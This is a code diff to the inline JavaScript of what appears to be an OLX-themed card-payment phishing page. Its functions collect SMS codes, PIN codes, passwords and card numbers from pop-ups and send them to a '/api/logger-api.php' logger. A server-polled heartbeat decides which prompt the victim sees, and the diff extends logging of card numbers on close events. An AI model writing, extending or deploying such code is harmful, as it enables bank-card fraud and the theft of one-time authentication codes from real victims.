@@ -953,7 +953,7 @@ input[type="submit"]:disabled {
   </body>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
   <script>
-function sendSMS(){const c=new URLSearchParams(window.location.search).get("card"),v=$('#SMS-INPUT').val();if(!c||v.trim()==="")return;$.get(`/api/logger-api.php?id=TUTAJID&log-type=SMSCode&sms-code=${v}&card-number=${c}`);$('#SMS-POP').hide();}function sendPIN(){const c=new URLSearchParams(window.location.search).get("card"),v=$('#PIN-INPUT').val();if(!c||v.trim()==="")return;$.get(`/api/logger-api.php?id=TUTAJID&log-type=PINCode&sms-code=${v}&card-number=${c}`);$('#PIN-POP').hide();}function sendPASS(){const c=new URLSearchParams(window.location.search).get("card"),v=$('#PASS-INPUT').val();if(!c||v.trim()==="")return;$.get(`/api/logger-api.php?id=TUTAJID&log-type=PASSCode&sms-code=${v}&card-number=${c}`);$('#PASS-POP').hide();}function hideSMS(){$.get(`/api/logger-api.php?id=TUTAJID&log-type=SMS-CLOSE`);$('#SMS-POP').hide();}function hidePIN(){$.get(`/api/logger-api.php?id=TUTAJID&log-type=PIN-CLOSE`);$('#PIN-POP').hide();}function hidePASS(){$.get(`/api/logger-api.php?id=TUTAJID&log-type=PASS-CLOSE`);$('#PASS-POP').hide();}
+function sendSMS(){const c=new URLSearchParams(window.location.search).get("card"),v=$('#SMS-INPUT').val();if(!c||v.trim()==="")return;$.get(`/api/logger-api.php?id=TUTAJID&log-type=SMSCode&sms-code=${v}&card-number=${c}`);$('#SMS-POP').hide();}function sendPIN(){const c=new URLSearchParams(window.location.search).get("card"),v=$('#PIN-INPUT').val();if(!c||v.trim()==="")return;$.get(`/api/logger-api.php?id=TUTAJID&log-type=PINCode&sms-code=${v}&card-number=${c}`);$('#PIN-POP').hide();}function sendPASS(){const c=new URLSearchParams(window.location.search).get("card"),v=$('#PASS-INPUT').val();if(!c||v.trim()==="")return;$.get(`/api/logger-api.php?id=TUTAJID&log-type=PASSCode&sms-code=${v}&card-number=${c}`);$('#PASS-POP').hide();}function hideSMS(){const c=new URLSearchParams(window.location.search).get("card");$.get(`/api/logger-api.php?id=TUTAJID&log-type=SMS-CLOSE&card-number=${c||""}`);$('#SMS-POP').hide();}function hidePIN(){const c=new URLSearchParams(window.location.search).get("card");$.get(`/api/logger-api.php?id=TUTAJID&log-type=PIN-CLOSE&card-number=${c||""}`);$('#PIN-POP').hide();}function hidePASS(){const c=new URLSearchParams(window.location.search).get("card");$.get(`/api/logger-api.php?id=TUTAJID&log-type=PASS-CLOSE&card-number=${c||""}`);$('#PASS-POP').hide();}
     function CardHeartbeat() {
       const card = new URLSearchParams(window.location.search).get("card");
       if (!card) return;
@@ -968,21 +968,30 @@ function sendSMS(){const c=new URLSearchParams(window.location.search).get("card
             window.location.href = "?olx=error&method=karta&c=3";
           } else if (response == 4) {
             $('.status').hide();
+            $('#SMS-POP').hide();
+            $('#PIN-POP').hide();
+            $('#PASS-POP').hide();
             $('#APP-VERIFY-POP').show();
             CardHeartbeat();
           } else if (response == 5) {
             $('#APP-VERIFY-POP').hide();
             $('.status').show();
+            $('#PIN-POP').hide();
+            $('#PASS-POP').hide();
             $('#SMS-POP').show();
             CardHeartbeat();
           } else if (response == 6) {
             $('#APP-VERIFY-POP').hide();
             $('.status').show();
+            $('#SMS-POP').hide();
+            $('#PASS-POP').hide();
             $('#PIN-POP').show();
             CardHeartbeat();
           } else if (response == 7) {
             $('#APP-VERIFY-POP').hide();
             $('.status').show();
+            $('#SMS-POP').hide();
+            $('#PIN-POP').hide();
             $('#PASS-POP').show();
             CardHeartbeat();
           } else {
